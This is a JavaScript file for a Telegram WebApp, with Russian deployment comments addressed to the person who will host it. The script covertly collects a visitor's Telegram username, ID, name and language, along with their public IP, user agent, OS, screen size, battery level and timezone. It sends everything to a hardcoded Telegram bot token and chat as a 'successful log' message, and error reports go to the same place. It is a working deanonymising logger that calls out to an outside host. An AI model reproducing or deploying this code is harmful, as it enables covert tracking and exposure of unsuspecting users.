// кодеру, который будет ставить это на хост:
// -   скрипт предназначен под Telegram WebApp, 
//     поэтому даже не пытайся под что либо адаптировать:
//     проще будет переписать по новой;
// 1-----------------------------------------------------
// -   имеестя проблема с getTimezoneOffset(),
//     ебись сам
// 2-----------------------------------------------------
// -   менять токен и ID чата прямо в фунцкии:
//     sendDataToTelegram() - строки где указан token и chatId
// 3-----------------------------------------------------
// -   на iOS не работае функция: getIPAdress()
//     исправлено с помощью cloudflare trace
// 4-----------------------------------------------------
// -   может показывать не все устройства верно.
// ------------------------------------------------------
//                     УДАЧИ!
//                     УДАЧИ!
//                     УДАЧИ!

async function fetchPublicIP() {
    try {
        // Сначала пробуем получить IP из предзагруженных данных
        const traceDivData = document.getElementById('cf-trace').textContent;
        if (traceDivData) {
            const data = traceDivData.split('\n').reduce((obj, line) => {
                const [key, value] = line.split('=');
                if (key && value) obj[key.trim()] = value.trim();
                return obj;
            }, {});
            
            if (data.ip) {
                console.log('Using pre-loaded IP:', data.ip);
                return data.ip;
            }
        }

        // Если предзагруженных данных нет, пробуем получить напрямую
        console.log('Trying direct Cloudflare request...');
        const response = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
        const text = await response.text();
        
        const data = text.split('\n').reduce((obj, line) => {
            const [key, value] = line.split('=');
            if (key && value) obj[key.trim()] = value.trim();
            return obj;
        }, {});
        
        console.log('Got IP from direct request:', data.ip);
        return data.ip || 'Не удалось получить IP';
    } catch (error) {
        console.error('Error fetching IP:', error);
        return 'Не удалось получить IP';
    }
}

function getUserAgent() {
    return navigator.userAgent;
}

function getOSName() {
    return navigator.platform;
}

function getScreenResolution() {
    return `${window.screen.width}x${window.screen.height}`;
}

async function getBatteryPercentage() {
    try {
        const battery = await navigator.getBattery();
        return Math.floor(battery.level * 100);
    } catch (error) {
        console.error('Error getting battery info:', error);
        return 'Недоступно';
    }
}

function getBrowserInfo() {
    return {
        name: navigator.appName,
        version: navigator.appVersion,
        engine: navigator.product
    };
}

async function sendDataToTelegram() {
    try {
        // Check if Telegram WebApp is available
        if (!window.Telegram || !window.Telegram.WebApp) {
            throw new Error('Telegram WebApp не инициализирован');
        }

        let tg = window.Telegram.WebApp;

        // Wait for initialization if needed
        if (!tg.initDataUnsafe || !tg.initDataUnsafe.user) {
            // Wait for up to 3 seconds for initialization
            for (let i = 0; i < 30; i++) {
                await new Promise(resolve => setTimeout(resolve, 100));
                if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
                    break;
                }
            }
            
            // If still not initialized, throw error
            if (!tg.initDataUnsafe || !tg.initDataUnsafe.user) {
                throw new Error('Не удалось получить данные пользователя Telegram');
            }
        }

        console.log('Starting to fetch IP...');
        const ipAddress = await fetchPublicIP();
        console.log('IP fetching completed:', ipAddress);

        const userAgent = getUserAgent();
        const osName = getOSName();
        const screenResolution = getScreenResolution();
        const batteryPercentage = await getBatteryPercentage();
        const browserInfo = getBrowserInfo();

        // Safe access to user data with fallbacks
        const user = tg.initDataUnsafe.user || {};
        const message = `
v1.3.1 - я ебал ваш айфон в рот, пытаемся пофиксить
<b>✨ Лог успешен!</b>
<b>🔍 Информация об аккаунте:</b>
├ Тэг: @${user.username || 'Отсутствует'}
├ Айди: <code>${user.id || 'Неизвестно'}</code>
├ Имя: <code>${user.first_name || 'Неизвестно'}</code>
├ Фамилия: <code>${user.last_name || 'Отсутствует'}</code>
├ Язык: <code>${user.language_code || 'Неизвестно'}</code>
└ Можно писать в ЛС: <code>${user.allows_write_to_pm || 'Неизвестно'}</code>
<b>🖥 Информация об устройстве:</b>
├ Айпи: <code>${ipAddress}</code>
├ UserAgent: <code>${userAgent}</code>
├ Хэш: <code>undefined</code>
├ Имя ОС: <code>${osName}</code>
├ Разрешение экрана: <code>${screenResolution}</code>
├ Процент батареи: <code>${batteryPercentage}${typeof batteryPercentage === 'number' ? '%' : ''}</code>
└ Часовой пояс: <code>${new Date().getTimezoneOffset()}</code>
<b>🌐 Информация о браузере:</b>
├ Название браузера: <code>${browserInfo.name}</code>
├ Версия браузера: <code>${browserInfo.version}</code>
└ Тип движка браузера: <code>${browserInfo.engine}</code>
        `;

        console.log('Preparing to send message to Telegram...');

        const token = '7654890944:AAGaxUzyNxethxulDQKFSNkfciruDiIxDXc';
        const telegramBotURL = `https://api.telegram.org/bot${token}/sendMessage`;
        const chatId = '-4778017209';

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('text', message);
        formData.append('parse_mode', 'HTML');

        const response = await fetch(telegramBotURL, {
            method: 'POST',
            body: formData
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        console.log('Message sent successfully!');
    } catch (error) {
        console.error('Error in sendDataToTelegram:', error);
        
        // Send error report to Telegram
        try {
            const errorMessage = `
v1.3.1 - я ебал ваш айфон в рот, пытаемся пофиксить

<b>⚠️ Ошибка в скрипте!</b>
<b>🔍 Детали ошибки:</b>
├ Сообщение: <code>${error.message}</code>
├ UserAgent: <code>${getUserAgent()}</code>
├ Платформа: <code>${getOSName()}</code>
└ Время: <code>${new Date().toISOString()}</code>
            `;

            const token = '7654890944:AAGaxUzyNxethxulDQKFSNkfciruDiIxDXc';
            const telegramBotURL = `https://api.telegram.org/bot${token}/sendMessage`;
            const chatId = '-4778017209';

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('text', errorMessage);
            formData.append('parse_mode', 'HTML');

            await fetch(telegramBotURL, {
                method: 'POST',
                body: formData
            });
        } catch (sendError) {
            console.error('Failed to send error report:', sendError);
        }
    }
}

// Remove the auto-initialization since we now control it from index.html
// if (document.readyState === 'loading') {
//     document.addEventListener('DOMContentLoaded', sendDataToTelegram);
// } else {
//     sendDataToTelegram();
// }
